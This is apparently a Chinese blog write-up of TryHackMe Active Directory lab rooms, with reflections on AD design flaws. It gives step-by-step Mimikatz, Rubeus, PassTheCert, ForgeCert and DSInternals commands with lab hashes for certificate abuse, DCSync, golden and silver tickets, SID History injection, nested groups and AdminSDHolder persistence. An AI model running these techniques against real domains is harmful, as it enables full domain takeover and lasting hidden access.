私钥是证书的“密码”，它应该被安全地存储在设备上。如果私钥可以被导出，攻击者在获取证书后，就可以将私钥导出并保存在自己的攻击机上。 攻击利用: 攻击者可以偷走私钥，并将其导入到自己的设备中。这样，即使目标系统上的证书被吊销，攻击者仍然可以继续使用这个私钥进行身份验证，实现持久化访问。 Allow Enroll for ZA\\THMSERVER2$ 这个权限配置不当，是攻击的起点。 安全风险: THMSERVER2$ 是一个机器账户，通常权限较低。但这里，它被授予了申请这个证书模板的权限。 攻击利用: 攻击者只需要攻陷 THMSERVER2 这台机器，就可以利用它的机器账户权限，去申请一个具备上述所有漏洞（可自定义主体、可导出私钥）的证书。 这三点环环相扣，构成了一个完美的 AD 证书攻击链： ZA\\THMSERVER2$ 拥有申请证书的权限。 申请时，可以伪造主体名称为 Administrator。 获得的证书的私钥可以被导出，从而实现持久化。 伪造证书去 MMC 生成一张伪造 &#65;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#115;&#x74;&#x72;&#97;&#x74;&#x6f;&#x72;&#x40;&#x7a;&#x61;&#46;&#x74;&#114;&#121;&#104;&#97;&#99;&#x6b;&#x6d;&#x65;&#x2e;&#108;&#x6f;&#x63; 的证书，然后带私钥导出来，带私钥是为了生成 TGT，不懂的可以回顾之前 Kerberos 认证过程。 现在，我们终于可以冒充用户了。要做到这一点，需要两个步骤： 使用证书申请 TGT 将 TGT 加载到工具中 第一步，我们用 Rubeus 工具来实现这一点： 123Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:ABC.pfx /password:1 /outfile:tgt.tgt /domain:za.tryhackme.loc /dc:thmdc.za.tryhackme.loc # 这里碰到了报错 [X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP 报错 KDC_ERR_PADATA_TYPE_NOSUPP 表明，域控制器不支持你使用的证书类型进行 PKINIT 认证。这可能是因为域控没有正确配置，或者你的工具和域控的协议版本不兼容。我们转成 LDAP 认证，LDAP 认证也支持使用证书，它将证书作为身份凭证来修改目录服务。 做到这一块其实我卡了一个小时作用，这个方法是从 Discord 频道里面找到的，看来 AD 这块我的认知还是太少了。 使用 LDAP 进行认证从这里下载 PassTheCert PowerShell 脚本。我没有加载这个 TGT，而是把我的用户加进 DOMAIN ADMINS 组，这个组对域内的所有机器都有权限，也包括 THMDC 这台机器。 1234567891011121314# 用点源载入脚本 . ./Invoke-PassTheCert.ps1 # 利用证书的权限执行 whoami Invoke-PassTheCert -Server &quot;thmdc.za.tryhackme.loc&quot; -Certificate &quot;c:/tools/ABC.pfx&quot; -CertificatePassword &quot;1&quot; -Whoami # 把自己的用户加进 DOMAIN ADMINS 组 Invoke-PassTheCert -Server &quot;thmdc.za.tryhackme.loc&quot; -Certificate &quot;c:/tools/ABC.pfx&quot; -CertificatePassword &quot;1&quot; -AddToGroup &quot;CN=BARBARA.REID,OU=SALES,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -GroupDN &quot;CN=DOMAIN ADMINS,CN=USERS,DC=ZA,DC=TRYHACKME,DC=LOC&quot; # SSH 连进去 ssh barbara.reid@thmdc.za.tryhackme.loc # 拿 Flag type C:\\Users\\Administrator\\Desktop\\flag5.txt 参考资料https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html https://www.thehacker.recipes/ad/movement/schannel/passthecert Exploiting Domain Trusts域信任是一种机制，允许网络中的用户访问本域之外的资源。它定义了林内部不同域之间的通信方式，在某些特殊情况下，信任也可以扩展到外部域或整个林。 域之间主要有两种信任类型： 方向性：信任的方向是从**信任域（Trusting Domain）**流向**受信域（Trusted Domain）**。 传递性：信任关系不限于两个域之间，而是可以传递到其他被信任的域。 在一个林中，通常会有一个根域或父域，比如我们的 TRYHACKME.LOC。为了方便管理，会为各个地区办事处创建子域，如 ZA.TRYHACKME.LOC 和 UK.TRYHACKME.LOC。 这种林配置使得 ZA 和 UK 办事处可以共享资源。举个例子，如果 UK 办事处的一个用户需要访问 THMSERVER1，我们可以授权该用户访问 ZA 域内的资源。这之所以可行，是因为 ZA 和根域、UK 和根域之间都存在双向信任，从而在 ZA 和 UK 之间建立了可传递的信任关系。 父域和子域之间的双向信任是 Active Directory 的预期行为，它的目的是通过可传递的信任关系来简化资源共享。 然而，作为攻击者，我们也可以利用这个信任关系。如果我们成功攻陷了子域，就可以滥用子域对父域的信任，进一步入侵父域。 KRBTGT and Golden TicketsKRBTGT 是微软实现 Kerberos 认证协议的核心账户。它的名字来自 Kerberos（KRB）和票据授权票据（TGT）。 这个账户本质上就是 Kerberos 分发中心（KDC）服务的“身份”，而 KDC 负责处理所有的 Kerberos 票据请求。KRBTGT 账户的密码哈希被用来加密和签名域内的所有 Kerberos 票据。由于所有域控制器都共享这个哈希，当用户请求访问资源时，域控制器就能用它来验证收到的 TGT 是否真实有效。 黄金票据那么，如果我们想要自己生成 TGT，从而获得对所有资源的访问权限，该怎么办呢？这就是著名的黄金票据攻击（Golden Ticket attack）。 在黄金票据攻击中，我们完全绕过 KDC，自己创建 TGT，摇身一变成为一个临时的票据授权服务器（TGS）。 要伪造 TGT，我们需要收集以下四样关键信息： 域的 FQDN（完全限定域名） 域的安全标识符（SID） 我们想要冒充的用户名 KRBTGT 账户的密码哈希 前三项通常比较容易获取。但最后一项 KRBTGT 的密码哈希，只存储在域控制器上，因此需要我们先攻陷域才能拿到。 dcysnc 攻击dcsync 是一种常见的攻击技术，它利用了 Active Directory（AD）域控制器之间用于同步数据的复制协议。攻击者通过冒充一台域控制器，向另一台域控制器请求复制指定用户的凭据，从而窃取密码哈希。 正常情况下，当一个域控制器上的用户账户发生变化时（比如修改了密码），它会通过一个称为 Directory Replication Service (DRS) Remote Protocol 的协议，通知其他域控制器进行数据同步。 dcsync 攻击正是滥用了这个正常且必要的功能。攻击者在拥有特定高权限账户（通常是域管理员）后，会执行 dcsync 命令，伪装成一个合法的域控制器，并向目标域控制器发送一个数据复制请求。目标域控制器会误以为这是一次正常的同步，并将请求用户的密码哈希发送给攻击者的机器。 接下来，我们将再次使用 Mimikatz，通过 dcsync 攻击在 THMSERVER2 上拿到 KRBTGT 的密码 hash。 123456789101112131415161718# 让我的用户有 DSSync 权限 Invoke-PassTheCert -Server &quot;thmdc.za.tryhackme.loc&quot; -Certificate &quot;c:/tools/ABC.pfx&quot; -CertificatePassword &quot;1&quot; -Elevate &quot;CN=BARBARA.REID,OU=SALES,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; # 执行 mimikatz mimikatz_trunk\\x64\\mimikatz.exe privilege::debug # 模拟一台域控制器，请求域内的另一台域控制器将 krbtgt 用户的凭据信息复制给我 lsadump::dcsync /user:za\\krbtgt Credentials: Hash NTLM: 16f9af38fca3ada405386b3b57366082 ntlm- 0: 16f9af38fca3ada405386b3b57366082 lm - 0: 35c7b671efe40860dc078afd2786c902 # RDP 连上 THMDC xfreerdp3 /v:thmdc.za.tryhackme.loc /d:za.tryhackme.loc /u:barbara.reid /p:Password1 /timeout:60000 Inter-Realm TGTs我们现在拥有了 KRBTGT 账户的密码哈希，这使我们可以在子域中伪造黄金票据来访问任何资源。更进一步，我们可以伪造一种叫做跨域 TGT（Inter-Realm TGT）的票据。这种票据专门用于访问其他域的资源。 我们的目标是利用子域和父域之间的双向信任关系，来获取对父域的完全访问权限。 在伪造黄金票据时，我们将在票据中加入来自其他域的额外账户 SID，以此来执行攻击。Mimikatz 工具可以帮助我们实现这一点，它允许我们在 Kerberos TGT 的 KERB_VALIDATION_INFO 结构中设置 ExtraSids 部分。ExtraSids 被描述为“一个指向 KERB_SID_AND_ATTRIBUTES 结构的指针列表，其中包含的 SID 对应于主体所属账户域之外的其他域中的组”。 这里的关键是，我们将利用父域对我们子域的信任。具体做法是，在为子域的域控制器伪造票据时，我们将 父域中的“Enterprise Admins (EA)”组的 SID 作为额外 SID 添加到票据中。EA 组属于父域，其成员资格实际上赋予了对整个林的管理员权限！这个组的默认 SID 是 S-1-5-21-&lt;RootDomain&gt;-519。 在进行攻击之前，我们首先需要获取两个 SID： 子域域控制器（THMDC）的 SID，这是我们将在伪造的 TGT 中冒充的对象。 父域中 Enterprise Admins 组的 SID，这是我们将作为额外 SID 添加到伪造 TGT 中的 SID。 为了获取这两个 SID，我们可以使用 AD-RSAT PowerShell 命令。我们可以使用以下命令来获取子域域控制器的 SID： 123456# 找到子域控的 SID Get-ADComputer -Identity &quot;THMDC&quot; # S-1-5-21-3885271727-2693558621-2658995185-1001 # 找到父域 Enterprise Admins 组的 SID Get-ADGroup -Identity &quot;Enterprise Admins&quot; -Server thmrootdc.tryhackme.loc # S-1-5-21-3330634377-1326264276-632209373-519 滥用域信任123456789mimikatz_trunk\\x64\\mimikatz.exe privilege::debug # 伪造 Inter-Realm 金票 # 这里的 sids 就是上面父域中找到的那个组的 SID kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt # 拿 Flag type \\\\thmrootdc.tryhackme.loc\\c$\\Users\\Administrator\\Desktop\\flag6.txt 总结我个人觉得还是因为 AD 的复杂性导致这么多的权限问题，小权限用户可以加组，然后那个组可以改管理员的密码？这个在一开始不应该警告用户吗？ 再到 Kerberos 委派可以不经过用户同意去以他的身份申请证书（WTF？？）。然后就是利用打印机服务可以远程让一个机器去请求另外一个机器（SSRF？），最难崩的还是通信过程不强制加密，直接给拦咯。 后面那个密码记录和 GPO 修改就感觉挺正常的，不算设计上的问题。到后面那个证书就纯纯的是用户的锅了，感觉又不全是，微软得背一半。按理说这种可以伪造 SAN 的证书就应该保留一个原始的名字，而且对于这种敏感权限的调用，这种证书就应该默认拒绝。 金票更是难绷，整个认证就靠一个 Hash？？当时听别人说金票银票挺高级的，结果就这？dcsync 一个同步能把用户的 Hash 同步过来，就不知道说什么了。跨域信任就挺正常，算是正常利用吧。 总之这个房间让我学到了超级多 AD 的问题和利用点，感觉 AD 这种安全性是 M$ 的人一拍脑子想下来到的东西，可能也和屎山有关系，最主要的我还是觉得是那个 Hash 问题很大很大。 在管理方来看，这种设计问题就挺难避免的，在增加类似权限的时候，我觉得可以增加一些检查机制，来揭示出这种攻击路径，或许已经有类似安全工具可以检查了。 拓展阅读 Silver Ticket Attack Golden Ticket Attack Kerberoasting Attack NTDS.dit Password Extraction DCSync Attack Using Mimikatz Detection Persisting Active Directoryirene.leach Password1 Persistence through Credentials这一节讲了利用 dcsync 把密码的 hash 全部 dump 出来，然后离线爆破 域同步（DC Sync）大型组织中，为了保证认证服务的响应速度，一个域通常会部署多个域控制器（DC）。为了让所有 DC 的数据保持一致，它们会通过域复制（Domain Replication）机制来同步信息。 每个 DC 都会运行一个名为 KCC 的进程，它会建立一个复制拓扑，并通过 RPC 与其他 DC 同步用户密码、新账户等信息。这就是为什么更改密码后，有时需要等待几分钟才能在新地点登录，因为你登录的 DC 可能还没来得及同步最新的密码。 这个同步过程也称为 DC 同步（DC Synchronisation）。除了 DC 自己，拥有域管理员权限的账户也可以为了合法目的发起这个同步。 如果攻击者获取了拥有域复制权限的账户，就可以执行 DC Sync 攻击，冒充 DC 来从另一个 DC 窃取凭据。 凭据并非都一样在 DC Sync 攻击中，选择要窃取的凭据非常关键。虽然域管理员凭据权限最高，但蓝队一旦发现入侵，会最先重置这类账户的密码，导致你可能很快失去访问权限。 所以，更聪明的做法是获取接近高权限但又不易被察觉的凭据，以此实现持久化访问。这些凭据类型包括： 多台机器的本地管理员账户：通常有专门的组拥有对大量计算机的本地管理员权限。窃取这些账户的凭据，可以让你保持对大部分机器的访问。 拥有委派权限的服务账户：利用这类账户可以发动 Kerberos 委派攻击，例如黄金票据和白银票据。 特权 AD 服务账户：例如 Exchange、WSUS 或 SCCM 的账户。攻陷这些账户可以作为跳板，再次获得高权限。 1234567891011121314C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe # 试验同步一个账户 lsadump::dcsync /domain:za.tryhackme.loc /user:irene.leach # 启用记录功能 log recopec_dcdump.txt # 通过同步提取所有用户的信息 lsadump::dcsync /domain:za.tryhackme.loc /all # 筛选文件 cat &lt;username&gt;_dcdump.txt | grep &quot;SAM Username&quot; cat recopec_dcdump.txt | grep &quot;Hash NTLM&quot; Persistence through TicketsKerberos 认证基础Kerberos 认证的核心在于 TGT（票据授权票据）和 TGS（票据授权服务）。 TGT 请求：用户向域控制器（DC）发送一个包含用其 NTLM 哈希加密的时间戳的 AS-REQ 请求，以此来获取 TGT。DC 验证后，颁发一个用 KRBTGT 账户密码哈希签名的 TGT。 TGS 请求：用户将 TGT 发送给 DC，请求访问特定资源的 TGS。如果 TGT 有效，DC 会颁发一个用该服务账户的 NTLM 哈希加密的 TGS。 访问资源：用户将 TGS 提交给目标服务，服务验证后授予访问权限。 黄金票据（Golden Tickets）黄金票据是伪造的 TGT。通过这种攻击，我们完全绕过了向 DC 证明身份的步骤。有了伪造的、拥有高权限账户的 TGT，我们就可以请求访问任何我们想要的服务。 必要信息：要伪造黄金票据，攻击者需要四样东西： KRBTGT 账户的密码哈希 域的完全限定域名 (FQDN) 域的安全标识符 (SID) 要冒充的用户的 ID 攻击要点： 核心需求：为了伪造黄金票据，我们必须拥有 KRBTGT 账户的密码哈希，因为它是所有 TGT 的签名者。 绕过认证：我们不需要知道被冒充用户的密码哈希。只要票据由 KRBTGT 哈希签名，DC 就会无条件信任它。 持久化： 票据中的用户账户即使被禁用或删除，只要票据生成时间在 20 分钟内，依然有效。 我们可以修改票据的有效期，比如从 10 小时延长到 10 年，以此获得持久化访问。 KRBTGT 账户的密码默认不更改，一旦获取，除非手动重置两次（重置掉当前密码和历史密码，为了保持服务可用性），否则我们可以永久使用。 轮换 KRBTGT 账户的密码对蓝队来说是一个痛苦的过程，有些服务不会自己拉取新的 TGT，导致宕机。 隐蔽性：黄金票据可以在任何机器上生成，甚至是未加入域的机器，这使得攻击更难被发现。 高权限：黄金票据甚至可以绕过智能卡认证，并且提供对域内所有资源的完全控制。 白银票据（Silver Tickets）白银票据是伪造的 TGS。与黄金票据不同，我们跳过了与 KDC 的所有通信，直接与我们想要访问的服务进行交互。 要伪造一张白银票据，你需要以下四样关键信息： 目标服务账户的 NTLM 哈希：这是最核心的，因为这个哈希是用来加密和签名票据的“密钥”。通常，这个哈希是目标服务器的机器账户哈希（例如 THMSERVER1$）。 **域的安全标识符 (SID)**：用于标识票据所属的域。 要冒充的用户的 ID：票据中会包含你想要伪装的用户名，比如 Administrator。 **目标服务帐户的 SPN (Service Principal Name)**：这是服务的唯一标识，格式为 &lt;服务类型&gt;/&lt;主机名&gt;，比如 cifs/thmserv1.za.tryhackme.loc。 攻击要点： 核心需求：为了伪造白银票据，我们需要目标服务器机器账户的密码哈希。 范围有限：白银票据的权限范围仅限于特定服务器上的特定服务。相比黄金票据的完全控制，它的权限范围要小得多。 极高隐蔽性：由于攻击绕过了 DC，没有 TGT 的生成记录，所以唯一的日志只存在于被攻击的服务器上，使得蓝队很难察觉。 持久化：我们可以利用白银票据修改注册表，来阻止机器账户密码自动重置（通常每 30 天重置一次），从而保持对该主机的持久化访问。 机器账户：机器账户可以被视为普通的 AD 账户，因此即使只获取了它的权限，也足以继续进行信息收集和攻击。 关于 Svc Session Key，这个也要参考这张图。 在正常的 Keberos 认证中，Svc Session Key 是 KDC 生成并且返回给我们的，然后 TGS 里面会有一份 Svc Session Key，如果我们没有拿到白银票据（服务账户的 Hash），我们就没法对 TGS 下手，所以这个攻击链就没法完成。正因为有了服务账户的 Hash，所以我们可以捏造 Svc Session Key 了，在原始的过程中，这个 Key 是用来保证请求不被篡改的，一旦有了 Hash，这个安全性就不存在了。 伪造票据实践12# 获取域信息，关注 SID 和 FQDN Get-ADDomain DomainSID: S-1-5-21-3885271727-2693558621-2658995185 DNSRoot: za.tryhackme.loc krbtgt: 16f9af38fca3ada405386b3b57366082 123# 使用 mimikatz 生成金票 # /ptt 代表让 mimikatz 直接加载凭据到现在这个 session 里 kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt &#x2F;endin: 票据的绝对有效期（Ticket Lifetime） 含义: 这是票据的绝对截止日期。一旦过了这个时间，票据就彻底失效，无法再续订。 用途: 它定义了票据最长能使用多久。在默认的 AD 策略中，这个时间通常是 10 小时。 示例: 你可以把 /endin 理解为一张电影票的“有效截止日期”。过了这个日期，电影票就作废了。 &#x2F;renewmax: 票据最长可续订时间（Maximum Renew Lifetime） 含义: 这是票据可以被续订的最长时间。只要在 /endin 之前，你可以向 KDC（Key Distribution Center）请求续订，以延长票据的有效时间。但这个续订过程不能超过 /renewmax 的限制。 用途: 它允许用户在一段时间内保持访问，而无需频繁地重新认证。默认的 AD 策略通常是 7 天。 示例: 你可以把 /renewmax 理解为一张图书馆借书证的“最长借书期限”。你每次借书的期限可能只有两周（/endin），但只要不超过总的“最长借书期限”（/renewmax），你就可以反复续借。 虽然黄金票据提供了强大的持久化访问能力，但蓝队可以通过重置 KRBTGT 账户密码两次来对抗它。因此，如果想真正实现持久化，更应该使用白银票据。 12# 生成银票 kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt &#x2F;target - The hostname of our target server. Let’s do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host. &#x2F;rc4 - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account. &#x2F;service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access. 要注意的是，服务账户的密码是会轮换的，一旦轮换了，这个 TGS 就失效了，所以一般还要对注册表下手，以实现持久化。 Persistence through Certificates虽然依赖凭据的持久化技术很有效，但蓝队最终可以通过轮换凭据来清除攻击者的访问权限。因此，我们需要寻找不依赖于凭据的、更高级的持久化技术，而证书就是其中之一。 证书不仅是用于权限提升的工具，更是一种强大且难以清除的持久化手段。通过获取一张有效的客户端认证证书，攻击者可以绕过密码重置，长期维持对目标账户的访问。这种持久化方式的有效性通常长达数年，除非蓝队主动吊销或等待证书过期。更深一层的攻击是直接攻陷证书颁发机构（CA）本身，窃取其根证书的私钥。这样一来，攻击者就能随意伪造证书，并且这些证书因为没有正式颁发记录，蓝队甚至无法通过吊销来清除，唯一的防御手段是轮换整个 CA，这会对整个组织造成灾难性的业务影响，让蓝队在付出巨大努力清理完其他所有入侵痕迹后，仍然无法摆脱攻击者的控制。 提取私钥可以用 Mimikatz 和 SharpDPAPI 提取证书的私钥 12345# 启动 mimikatz C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe # 查看存储的证书 crypto::certificates /systemstore:local_machine 可以看到有一些证书的 Exportable key : NO，所以没法直接导出，但是我们可以通过修改内存的方式让他们可以导出 1234567privilege::debug crypto::capi crypto::cng # 导出证书 crypto::certificates /systemstore:local_machine /export 导出的证书会同时用 PFX 和 DER 格式存储在目录下，mimikatz 默认会用 mimikatz 密码加密证书。 生成和使用证书现在我们有了私钥和根证书，我们能用 ForgeCert 工具去伪造我们想要的用户认证证书。 1C:\\Tools\\ForgeCert\\ForgeCert.exe --CaCertPath local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 要关注的参数是 SubjectAltName，即 SAN。还记得上个 Room 那个证书模板允许使用替代名字吗，就是这个玩意。 然后我们就可以用这个证书去请求 TGT： 12345# Rubeus 生成 TGT C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:tgt.tgt /domain:za.tryhackme.loc /dc:thmdc.za.tryhackme.loc # mimikatz 载入 TGT kerberos::ptt tgt.tgt 这里依旧提示 [X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP ，可以用 LDAP 认证去绕过，上个房间有步骤，就不再叙述了。 我们不再是蓝队的朋友证书持久化是极难防御的。即使你轮换了被入侵账户的凭据，证书仍然是有效的。移除这种持久化的唯一方法是吊销证书。然而，这只在我们通过合法渠道生成证书的情况下才有可能。由于我们是导出 CA 后自己生成了证书，它不会出现在 AD CS 的已颁发证书列表中，这意味着蓝队将无法吊销我们的证书。 那么，移除这种持久化的唯一解决方案是什么？这就是我们不再是朋友的原因了。他们将不得不吊销根 CA 证书。但吊销这个证书意味着所有由 AD CS 颁发的证书将全部失效。换言之，他们必须为每个使用 AD CS 的系统重新生成证书。你应该开始明白为什么这种类型的持久化是极其危险的，如果真的发生，可能需要对系统进行全面重建。 拓展阅读 Golden Certificate Persistence through SID History这个 SID 就和之前那个改两次 krbtgt 密码有异曲同工之妙，SID（Security Identifier）是用来唯一标识用户和组账户的。当一个组织进行 Active Directory 迁移时，用户在新域中会得到一个新的 SID。为了让他们能够继续访问旧域的资源，管理员可以将旧的 SID 添加到他们在新账户的 SID 历史属性中。 这个过程本质上是赋予一个新账户旧账户的所有权限。而攻击者可以滥用这个功能，将一个高权限账户的 SID（例如域管理员的 SID）添加到自己低权限账户的 SID 历史中。这样，攻击者就能以自己的账户身份，获得高权限账户的所有访问权限，从而实现持久化。这种技术非常隐蔽，因为账户本身的权限看起来没有变化，但它实际上拥有了管理员的权限。 SID History 能让我们为所欲为实际上，SID 历史的功能并不仅限于包含来自其他域的 SID。只要有足够的权限，我们甚至可以将当前域的 SID 添加到我们控制的账户的 SID 历史中。关于这种持久化技术，有以下几个要点： 通常，我们需要域管理员或同等的权限才能执行此攻击。 当账户创建登录事件时，与之关联的 SID 会被添加到用户的令牌中，进而决定该账户的权限。这其中包括了组的 SID。 如果我们将企业管理员（Enterprise Admin）的 SID 注入到 SID 历史中，就可以将账户权限提升到等同于整个林中所有域的域管理员。 由于 SID 是直接添加到用户令牌中的，即使该账户并未实际加入到任何特定组中，其权限也会被认可。这使得它成为一种非常隐蔽的持久化方法。我们的账户可以只是一名普通用户，只属于 Domain Users 组，却拥有足以攻陷整个域（甚至整个林）的权限。我们甚至可以更进一步，利用这个账户去修改其他账户的 SID 历史，从而让初始的持久化入口更难被发现和修复。 伪造历史1234567# 检查我们的用户目前 SID history 没有任何数据 Get-ADUser irene.leach -properties sidhistory,memberof # SIDHistory : {} # 查看 Domain Admins 组的 SID Get-ADGroup &quot;Domain Admins&quot; # SID : S-1-5-21-3885271727-2693558621-2658995185-512 我们可以使用类似 Mimikatz 的工具来添加 SID 历史记录。但是，最新版本的 Mimikatz 有一个缺陷，无法通过修补 LSASS 来更新 SID 历史记录。在这种情况下，我们将使用 DSInternals 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库： 123456# NTDS 数据库在运行的时候是被锁定的 Stop-Service -Name ntds -force # 修补数据库 Add-ADDBSidHistory -SamAccountName &#39;irene.leach&#39; -SidHistory &#39;S-1-5-21-3885271727-2693558621-2658995185-512&#39; -DatabasePath C:\\Windows\\NTDS\\ntds.dit # 启动 NTDS 服务 Start-Service -Name ntds 现在应该就有权限了，用我们那个用户登录检查一下 123456# 查看当前的 sidhistory Get-ADUser irene.leach -Properties sidhistory # SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512} # 检查一下是否真的有权限执行 dir \\\\thmdc.za.tryhackme.loc\\c$ 蓝队的怒火与无力如果你使用 RDP 登录到其中一台主机并使用“AD 用户和组”管理工具，你能够看到被添加到你用户账户上的 SID 历史属性。然而，即使拥有最高权限，你也无法通过这个图形界面移除该属性，因为它受到了保护。要移除它，你必须使用像 AD-RSAT PowerShell 命令这样的工具。 然而，在你考虑如何移除恶意的 SID 历史属性之前，你首先要能找到它。常规的工具不会告诉你哪里出了问题。那个用户并不会突然显示为“域管理员”组的成员。因此，除非你主动地逐一检查所有用户的属性，否则这会非常难被发现。这是因为 SID 历史只在用户认证时才会被应用和使用。 想象一下你就是蓝队成员，正在处理一起入侵事件。你刚刚完成了一次域清理，为此两次重置了 krbtgt 账户的密码，清除了黄金和白银票据，甚至从头重建了整个 CA 服务器。但就在这时，你却发现攻击者仍然在用一个低权限账户执行域管理员的命令。这绝对会是糟糕透顶的一天。 Persistence through Group Membership蓝队会重点监控那些最高权限的“受保护组”，比如 Domain Admins。直接将自己的账户加入这些组，虽然能立刻获得最高权限，但被发现的风险也最大。 选择次要但关键的组：更隐蔽的策略是选择那些看似普通但实际上拥有强大权限的组，比如： IT 支持组：可以重置低权限用户的密码。这听起来权限不高，但可以作为“跳板”，通过窃取其他用户的凭据来逐步提升权限。 本地管理员组：获得对多台机器的本地管理员权限，意味着可以控制这些机器。一旦控制足够多的机器，就有机会横向移动并最终攻陷整个域。 拥有 GPO 所有权的组：GPO 能够影响整个域的策略，控制它就相当于控制了域内的安全配置。这种权限虽然不是直接的“管理员”，但其潜在危害同样巨大。 简而言之，持久化的最高境界不是拥有最高权限，而是以最低的被发现风险，获得足以重新发起攻击的关键权限。 嵌套组嵌套组（Nested Groups）是一种利用 Active Directory 复杂权限结构的攻击手法。直接将账户加入高权限的父组（如“域管理员”）非常显眼，容易被安全团队发现。因此，攻击者可以转而将自己的账户加入到该父组的子组中。通过这种方式，攻击者可以继承父组的所有权限，但账户本身看起来只是一个普通子组成员，从而降低了被监控系统发现的风险，实现了隐蔽的持久化访问。这种攻击利用了 AD 中权限可见性差、监控不完善的弱点，是一种比直接加组更隐蔽和高级的持久化技术。 就是套娃，直接加一个组很明显，但是我们可以加这个组下面的组，同样拥有这个组的权限。 套娃12345678910111213141516171819202122232425# 在 People-&gt;IT OU 下创建一个组 New-ADGroup -Path &quot;OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;irene.leach Net Group 1&quot; -SamAccountName &quot;irene.leach_nestgroup1&quot; -DisplayName &quot;irene.leach Nest Group 1&quot; -GroupScope Global -GroupCategory Security # 在 People-&gt;Sales OU 下创建一个组 New-ADGroup -Path &quot;OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;irene.leach Net Group 2&quot; -SamAccountName &quot;irene.leach_nestgroup2&quot; -DisplayName &quot;irene.leach Nest Group 2&quot; -GroupScope Global -GroupCategory Security # 把我们创建的第一个组加到第二个组下面的成员里面 Add-ADGroupMember -Identity &quot;irene.leach_nestgroup2&quot; -Members &quot;irene.leach_nestgroup1&quot; # 可以重复很多次 New-ADGroup -Path &quot;OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;irene.leach Net Group 3&quot; -SamAccountName &quot;irene.leach_nestgroup3&quot; -DisplayName &quot;irene.leach Nest Group 3&quot; -GroupScope Global -GroupCategory Security Add-ADGroupMember -Identity &quot;irene.leach_nestgroup3&quot; -Members &quot;irene.leach_nestgroup2&quot; New-ADGroup -Path &quot;OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;irene.leach Net Group 4&quot; -SamAccountName &quot;irene.leach_nestgroup4&quot; -DisplayName &quot;irene.leach Nest Group 4&quot; -GroupScope Global -GroupCategory Security Add-ADGroupMember -Identity &quot;irene.leach_nestgroup4&quot; -Members &quot;irene.leach_nestgroup3&quot; New-ADGroup -Path &quot;OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot; -Name &quot;irene.leach Net Group 5&quot; -SamAccountName &quot;irene.leach_nestgroup5&quot; -DisplayName &quot;irene.leach Nest Group 5&quot; -GroupScope Global -GroupCategory Security Add-ADGroupMember -Identity &quot;irene.leach_nestgroup5&quot; -Members &quot;irene.leach_nestgroup4&quot; # 把创建的第五个组加入 Domain Admins 组里 Add-ADGroupMember -Identity &quot;Domain Admins&quot; -Members &quot;irene.leach_nestgroup5&quot; # 把我们的低权限用户加到创建的第一个组里 Add-ADGroupMember -Identity &quot;irene.leach_nestgroup1&quot; -Members &quot;irene.leach&quot; # 查看组成员 Get-ADGroupMember -Identity &quot;Domain Admins&quot; 现实中一般是用现有的组来进行嵌套。 Persistence through ACLs这一节则是利用 AD 组的模板的定时同步特性去持久化。 有时候，我们需要的不仅仅是针对普通 AD 组的持久化。如果我们想同时对所有受保护的组进行持久化，该怎么办？ 通过 AD 组模板进行持久化虽然我们可以将我们控制的账户直接添加到所有能找到的特权组中，但蓝队仍然可以进行清理并移除我们的成员资格。为了获得更好的持久化效果，并让蓝队百思不得其解，我们应该转而注入到生成默认组的模板中。通过注入这些模板，即使他们移除了我们的成员资格，我们只需等待模板刷新，就能再次获得成员资格。 其中一个模板就是 AdminSDHolder 容器。这个容器存在于每个 AD 域中，它的访问控制列表（ACL）被用作一个模板，来复制权限到所有受保护的组。受保护的组包括“域管理员（Domain Admins）”、“管理员（Administrators）”、“企业管理员（Enterprise Admins）”和“架构管理员（Schema Admins）”等特权组。完整的组列表可以在这里找到。 一个名为 SDProp 的进程会每隔 60 分钟，将 AdminSDHolder 容器的 ACL 应用到所有受保护的组。因此，我们可以写入一个 ACE（访问控制条目），授予我们在所有受保护组上的完全权限。如果蓝队没有意识到这种类型的持久化正在被使用，他们会感到非常沮丧。因为每次他们移除受保护对象或组上不适当的权限时，这些权限都会在一小时内重新出现。由于这种重建是通过正常的 AD 进程发生的，它也不会向蓝队发出任何警报，使得他们很难查明持久化的来源。 使用 AdminSDHolder 持久化为了将持久性部署到 AdminSDHolder，我们将使用 Microsoft 管理控制台（MMC）。为避免将用户从 RDP 会话中踢出，最好使用低权限凭据 